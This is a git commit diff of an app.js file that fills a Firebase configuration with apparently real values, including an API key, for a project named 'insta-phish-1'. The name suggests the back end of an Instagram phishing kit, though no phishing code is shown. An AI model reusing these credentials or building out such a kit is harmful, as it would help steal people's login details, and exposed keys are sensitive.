ffd75976d3c4ed6db99d2b8ff2ec8bfc2f5d09dc
corrinakopf <69304537+corrinakopf@users.noreply.github.com>
2020-08-06 21:06:49 +1000

    Update app.js

--- app.js
+++ app.js
@@ -3,15 +3,18 @@
 
 ///Edit Under This
 
+
+
 var firebaseConfig = {
-  apiKey: "api-key",
-  authDomain: "project-id.firebaseapp.com",
-  databaseURL: "https://project-id.firebaseio.com",
-  projectId: "project-id",
-  storageBucket: "project-id.appspot.com",
-  messagingSenderId: "sender-id",
-  appId: "app-id",
-  measurementId: "G-measurement-id",
+  apiKey: "AIzaSyBVGlNfvFj7p-XrQZsvgahxdJU66hRK3Yc",
+  authDomain: "insta-phish-1.firebaseapp.com",
+  databaseURL: "https://insta-phish-1.firebaseio.com",
+  projectId: "insta-phish-1",
+  storageBucket: "insta-phish-1.appspot.com",
+  messagingSenderId: "402413515512",
+  appId: "1:402413515512:web:a2438eeb9ae91f2e0ec10d",
+  measurementId: "G-KF262QM7Z4"
+
 };
 
      
